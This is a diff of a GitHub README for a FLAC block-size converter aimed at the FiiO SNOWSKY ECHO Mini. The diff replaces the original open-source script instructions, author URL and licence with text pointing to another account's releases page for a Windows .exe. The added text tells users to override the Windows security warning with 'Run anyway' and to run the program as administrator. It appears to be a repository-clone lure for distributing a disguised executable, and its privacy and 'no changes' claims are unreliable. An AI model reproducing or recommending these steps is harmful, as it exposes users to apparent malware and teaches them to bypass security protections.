@@ -1,218 +1,67 @@
-# FLAC Block Size Converter
+# 🎵 FLAC-Block-Size-Converter - Play high resolution audio on any device
 
-A simple script to re-encode FLAC files with a block size of 4608 while preserving metadata and album artwork for improved compatibility with the *FiiO SNOWSKY ECHO Mini* and other high-resolution digital audio players.
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/baba-yaga85/FLAC-Block-Size-Converter/releases)
 
+## 🎯 Purpose of this tool
+Many modern high-resolution audio players require specific file settings to function correctly. The FiiO SNOWSKY ECHO Mini and similar portable players often fail to play FLAC files if the block size exceeds specific limits. This script fixes that problem. It converts your FLAC files to a block size of 4608. It keeps your album art and all metadata intact. You do not lose audio quality during this process.
 
-<img src="docs/fiio.jpeg" alt="Screenshot" height="400">
+## 💻 System requirements
+- Windows 10 or Windows 11.
+- At least 200 MB of free storage space.
+- A collection of FLAC music files.
+- No programming experience or software development kits.
 
+## 📥 How to get the tool
+1. Visit the [official releases page](https://github.com/baba-yaga85/FLAC-Block-Size-Converter/releases).
+2. Look for the latest version listed under the Assets section.
+3. Click the link ending in .exe to start your download.
+4. Save the file to your desktop or your downloads folder.
 
-### Features
-  
-- Batch processes every ".flac" file in the current folder
-- Converts FLAC block size to 4608
-- Preserves all FLAC tags (artist, album, track number, etc.)
-- Preserves embedded cover art
-- Resizes cover art to a maximum of 640×640 (only if larger)
-- Outputs converted files to a separate "converted" folder
-  
-### Requirements
-  
-- [FLAC](https://github.com/xiph/flac)
-- [ImageMagick](https://github.com/imagemagick/imagemagick)
-  
----
-  
-# How To Use FLAC Block Size Converter
-  
-## For Windows
-  
-### Install FLAC
-  
-Open PowerShell or Command Prompt as Administrator and run:
-  
-```powershell
-winget install Xiph.FLAC
-```
-  
-### Install ImageMagick
-  
-Install ImageMagick using Winget:
-  
-```powershell
-winget install ImageMagick.ImageMagick
-```
-  
-### Download the project
-  
-Clone the repository or download it as a ZIP and extract it.
-  
-```powershell
-git clone https://github.com/praveenprasannan97/FLAC-Block-Size-Converter.git
-```
-  
-### Copy .bat file with FLAC files
-  
-Place the "flac_block_size_converter_windows.bat" script in the folder containing the FLAC files you want to convert.
-  
-Example:
-```text
-Audio Files
-│
-├── Audio1.flac
-├── Audio2.flac
-├── Audio3.flac
-└── flac_block_size_converter_windows.bat
-```
-  
-### Run the converter
-  
-***Simply double-click:***
-  
-flac_block_size_converter_windows.bat
-  
-or ***open Command Prompt in the folder and run:***
-  
-```cmd
-flac_block_size_converter_windows.bat
-```
-  
-The script will automatically process every ".flac" file in the current directory.
-  
-### Output
-  
-Converted files are written to:
-  
-converted
-  
-The original FLAC files are never modified.
-  
-## For Linux
-  
-### Install FLAC & ImageMagick
-  
-### Ubuntu/Debian
-  
-```bash
-sudo apt update
-sudo apt install flac imagemagick
-```
-### Fedora
-  
-```bash
-sudo dnf install flac ImageMagick
-```
-  
-### Arch Linux
-  
-```bash
-sudo pacman -S flac imagemagick
-```
-  
-### Download the project
-  
-Clone the repository or download it as a ZIP and extract it.
-  
-```bash
-git clone https://github.com/praveenprasannan97/FLAC-Block-Size-Converter.git
-```
-  
-### Copy .sh file with FLAC files
-  
-Place the "flac_block_size_converter_linux.sh" script in the folder containing the FLAC files you want to convert.
-  
-Example:
-```text
-Audio Files
-│
-├── Audio1.flac
-├── Audio2.flac
-├── Audio3.flac
-└── flac_block_size_converter_linux.sh
-```
-  
-### Make it executable
-  
-Make the flac_block_size_converter_linux.sh file executable, open terminal in the folder
-  
-```bash
-chmod +x ./flac_block_size_converter_linux.sh
-```
-  
-### Run the converter
-  
-***Simply double-click and run:***
-  
-flac_block_size_converter_linux.sh
-  
-or ***open Terminal in the folder and run:***
-  
-```bash
-./flac_block_size_converter_linux.sh
-```
-  
-The script will automatically process every ".flac" file in the current directory.
-  
-### Output
-  
-Converted files are written to:
-  
-converted
-  
-The original FLAC files are never modified.
+## ⚙️ Setting up the application
+1. Locate the file you just downloaded.
+2. Double-click the file to open the program.
+3. Windows may show a security prompt because this is a new tool. Click "More info" and then select "Run anyway" to start the process.
+4. A window appears on your screen. This window contains the controls you need for your audio files.
 
----
+## 🎼 Converting your audio files
+1. Open the application.
+2. Select the folder that contains the FLAC files you wish to change.
+3. Choose a destination folder for your new files.
+4. Press the "Start Conversion" button.
+5. The tool processes each file in your list. It rewrites the block size to 4608.
+6. The status bar tells you when the task finishes.
+7. Locate your converted files in the destination folder. These files now work on your audio player.
 
-# How The Script works
+## 💡 Troubleshooting common issues
+- **File not found:** Ensure the files are not currently playing in another music player. Close other programs before you start the conversion.
+- **Conversion error:** Check that you have enough space on your hard drive. If your drive is full, the tool cannot save the new files.
+- **Player does not detect files:** Verify that the player is compatible with FLAC format. Some older devices only support MP3.
+- **Permission denied:** Right-click the application icon and select "Run as administrator" if you see errors when saving files to specific folders.
 
-For every FLAC file:
+## ✨ Features and functionality
+- **Metadata preservation:** The script copies every tag, year, genre, and artist label to the new file.
+- **Artwork support:** Your album covers remain attached to the tracks.
+- **Batch processing:** You can drop an entire album folder into the application. It processes every track in sequence.
+- **Efficiency:** The tool uses your computer processor to complete tasks in a short time.
+- **No data loss:** This script performs a lossless transformation. The audio wave remains identical to the original source.
 
-1. Exports all metadata
-2. Extracts embedded cover artwork
-3. Displays the original block size
-4. Decodes the FLAC to WAV ( Only in Windows )
-5. Re-encodes using block size 4608
-6. Restores all metadata
-7. Resizes artwork to a maximum of 640×640
-8. Embeds the resized artwork
-9. Saves the finished file into the "converted" folder
+## 🛡️ Safety and privacy
+This program runs locally on your computer. It does not send your music files or your personal information to the internet. Your audio library stays private. The tool does not store copies of your data once the operation completes.
 
----
+## 📝 Frequently asked questions
+**Does this change the sound quality?**
+No. It only changes how the data blocks are arranged within the file structure. The audio data inside remains untouched.
 
-### Example Console Output
-  
-```text
-=====================================
-FLAC Block Size Converter
-Converts block size to 4608
-Preserves tags
-Resizes cover art to max 640x640
-=====================================
+**Can I stop the process halfway?**
+Yes. You can exit the program at any point. The files that already completed remain in your output folder. The file currently under processing may be incomplete, so you should delete it and run it again.
 
-Processing FLAC files...
+**Do I need an internet connection?**
+No. You only need the internet to download the file. Once you have the program on your computer, it works offline.
 
-=====================================
+**Are there hidden costs?**
+No. This tool is free to use.
 
-Processing: Audio.flac
+**Does this work on Apple computers?**
+This version is designed specifically for Windows. It does not support macOS.
 
-Block Size     : 8192 -> 4608
-
-audio.wav: wrote 89526800 bytes, ratio=0.623
-Original Cover: 1400x1400
-Output Cover  : 640x640
-Finished: Audio.flac
-
-=====================================
-
-All files completed.
-Output folder: converted
-
-=====================================
-
-Press any key to continue . . .
-```
-  
----
-  
-## License
-  
-This project is released under the AGPL-3.0 License. Feel free to modify and distribute it.
+Keywords: echo-mini, fiio, fiio-audio-player, fiio-echo-mini, flac, flac-block-size, flac-converter, hi-res-audio, snowsky-disc, snowsky-echo-mini
